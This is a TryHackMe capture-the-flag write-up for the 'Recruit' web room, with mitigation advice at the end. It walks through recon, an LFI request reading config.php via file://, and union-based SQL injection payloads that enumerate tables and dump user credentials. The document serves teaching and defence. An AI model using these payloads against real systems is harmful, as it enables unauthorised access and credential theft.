# TryHackMe — Recruit (Writeup)

Recruit — Infiltrate Recruit's new portal. Map the site, hunt for flaws, and gain unauthorised access 
https://tryhackme.com/guest-share/0f402c9bae60d27d42585e82266130e44d7a4e67

**Target:** Target_IP

**Category:** Web Exploitation

**Techniques:** Enumeration, Information Disclosure, LFI, SQL Injection, Privilege Escalation

---

## 1. Reconnaissance

An initial Nmap scan was run to identify open ports and running services:

```bash
nmap -sC -sV -Pn TARGET_IP
```
<img width="696" height="438" alt="Screenshot 2026-09-30 175122" src="https://github.com/user-attachments/assets/aa1b8c02-2c4b-4f71-a159-e70e2419c06e" />

**Results:**

| Port | Service | Version |
|------|---------|---------|
| 22/tcp | ssh | OpenSSH 8.2p1 (Ubuntu) |
| 53/tcp | domain | ISC BIND 9.16.1 (Ubuntu) |
| 80/tcp | http | Apache httpd 2.4.41 (Ubuntu), title "Recruit" |

Port 80 was the obvious entry point.

---

## 2. Directory Enumeration

Gobuster was used to discover hidden content on the web server:

```bash
gobuster dir -u TARGET_IP -w /usr/share/seclists/Discovery/Web-Content/common.txt
```
<img width="725" height="463" alt="Screenshot 2026-09-30 175820" src="https://github.com/user-attachments/assets/b00b06c4-667a-4bc7-aea8-96a0d45b67ae" />

**Findings:**

| Path | Status | Notes |
|------|--------|-------|
| `/assets/` | 301 | Static assets |
| `/javascript/` | 301 | JS files |
| `/mail/` | 301 | Internal mail directory |
| `/phpmyadmin/` | 301 | DB admin panel |
| `/sitemap.xml` | 200 | Site structure disclosure |

---

## 3. Sitemap Disclosure

`sitemap.xml` listed several endpoints not linked from the main site, grouped under HTML comments:
<img width="951" height="746" alt="Screenshot 2026-09-30 175948" src="https://github.com/user-attachments/assets/8b642c1d-27c5-4bbf-88c3-72c36b511bd3" />

- **CV Retrieval Service** → `file.php`
- **Mails** → `/mail/`
- **Authenticated Pages** → `dashboard.php`, `logout.php`
- **Static Assets** → `/assets/`

The sitemap also contained developer notes hinting that "some directories may contain internal documentation or logs" and that "access is role-restricted" — a strong pointer toward `/mail/`.

---

## 4. Mail Log Information Disclosure

Browsing to:

```
http://TARGET_IP/mail/mail.log
```
<img width="947" height="669" alt="Screenshot 2026-09-30 180432" src="https://github.com/user-attachments/assets/b7efa2e7-8a5a-4757-91e0-a029036aceef" />

exposed a plaintext internal email from "HR Operations" confirming the portal deployment. Critically, it disclosed:

> HR login credentials (username: `hr`) are currently stored in the application configuration file (`config.php`) for ease of access during the initial rollout phase.

This was a direct tip-off to pivot toward reading `config.php`.

---

## 5. Local File Inclusion (LFI) → Source Disclosure

The `file.php` endpoint (the "CV Retrieval Service") accepted a `cv` parameter without validation, allowing arbitrary local file reads via the `file://` wrapper:

```
http://TARGET_IP/file.php?cv=file:///var/www/html/config.php
```

This returned the raw PHP source of the configuration file, including:

```php
$HR_PASSWORD = 'TARGET_PASSWORD';
```
<img width="947" height="612" alt="Screenshot 2026-09-30 181127" src="https://github.com/user-attachments/assets/b68a7792-7177-45a7-bff0-d5b974240d61" />

The file also contained a developer comment noting the credential was stored there "temporarily" and would later be moved to the database — a design flaw that directly caused this leak.
**Why this path worked:**
- `file.php` passed the `cv` parameter straight into a file-reading function (e.g. `readfile()`/`file_get_contents()`) with no validation — a classic LFI.
- The `file://` wrapper forces PHP to read the raw bytes off disk rather than execute them, which is why the actual PHP source was returned instead of a blank/executed page.
- The path itself wasn't guessed blindly: Nmap had already fingerprinted the host as Ubuntu + Apache, whose default document root is `/var/www/html/`, and `mail.log` had already leaked the filename `config.php`. Combining the standard docroot with the leaked filename gave the full path.

---

## 6. Initial Authentication

Using the leaked credentials (`hr` / TARGET_PASSWORD) to log in granted access to `dashboard.php`, a "Candidate Applications" portal.

**Flag (user level):**
<img width="943" height="556" alt="Screenshot 2026-09-30 181334" src="https://github.com/user-attachments/assets/0c68cc85-7c0e-4305-82b4-07195a7e1c49" />


---

## 7. SQL Injection (Union-Based)

The `search` parameter on `dashboard.php` was found to be vulnerable to SQL injection. The query was broken out of using a single quote, and `UNION SELECT` was used to pull data from other tables.

**Step 1 — Determine column count:**

```
dashboard.php?search=%' UNION SELECT 1,2,3,4-- -
```

This returned successfully with 4 columns and no SQL error, confirming the underlying query selects 4 columns and that columns 2 and 3 are reflected in the output (Name and Position fields).

**Step 2 — Enumerate tables:**

```
dashboard.php?search=%' UNION SELECT 1, table_name, 3, 4 FROM information_schema.tables WHERE table_schema=database()-- -
```

This revealed two application tables: `candidates` and `users`.
<img width="947" height="677" alt="Screenshot 2026-09-30 181908" src="https://github.com/user-attachments/assets/e3eec699-e137-4896-997f-d18184df0b02" />


**Step 3 — Dump credentials from `users`:**

```
dashboard.php?search=%' UNION SELECT 1, username, password, 4 FROM users-- -
```

**Result:**

<img width="945" height="645" alt="Screenshot 2026-09-30 182007" src="https://github.com/user-attachments/assets/9a412ec7-71fd-445e-a967-bba9b8951590" />


---

## 8. Privilege Escalation to Admin

Logging in with the dumped admin credentials (`admin` / `ADMIN_PASSWORD`) upgraded access to an administrative dashboard with Approve/Reject controls and an "Access API" link.

**Flag (admin level):**
<img width="951" height="712" alt="Screenshot 2026-09-30 182325" src="https://github.com/user-attachments/assets/109561a2-3926-4897-86a9-2f3678e36a60" />


---

## Attack Chain Summary

```
Nmap/Gobuster recon
     │
     ▼
sitemap.xml → reveals /mail/ and file.php
     │
     ▼
mail.log → leaks that HR creds live in config.php
     │
     ▼
LFI in file.php → reads config.php → HR_PASSWORD
     │
     ▼
Login as HR → dashboard.php (user flag)
     │
     ▼
SQLi in search param → dump admin credentials
     │
     ▼
Login as admin → admin dashboard (admin flag)
```

---

## Mitigations

### Information Disclosure (sitemap.xml, mail.log)
- Never expose internal documentation, logs, or developer notes on a public-facing web root.
- Remove or restrict access to `sitemap.xml` entries that reference non-public functionality.
- Mail logs and debug logs should be stored outside the webroot and never be world-readable.

### Hardcoded / Misplaced Credentials (config.php)
- Never store credentials in application code or config files, even "temporarily." Use environment variables or a secrets manager.
- Treat "temporary" workarounds as permanent risks — track and remediate them before go-live, not after.
- Rotate any credential that was ever committed to a file, even internally.

### Local File Inclusion (file.php)
- Never pass user input directly into file-system or stream-wrapper functions (e.g., `include`, `fopen`, `file_get_contents`).
- Disable dangerous PHP wrappers (`allow_url_include = Off`, restrict `file://` access) where not needed.
- Use an allow-list of permitted filenames/paths, and strip path traversal sequences, or better, use indirect references (e.g., database IDs) instead of raw filenames.

### SQL Injection (dashboard.php search)
- Use parameterized queries / prepared statements for all database access — never concatenate user input into SQL.
- Apply least-privilege database accounts (the web app user should not be able to query `information_schema` or unrelated tables).
- Add input validation and a Web Application Firewall (WAF) as defense-in-depth, though this should never replace parameterized queries.

### General
- Enforce strong, unique passwords.
- Apply role-based access control server-side, not just via UI differences between HR and admin dashboards.
- Conduct regular code review and automated SAST/DAST scanning to catch these classes of bugs before deployment.

---

*Writeup prepared for TryHackMe room "Recruit".*
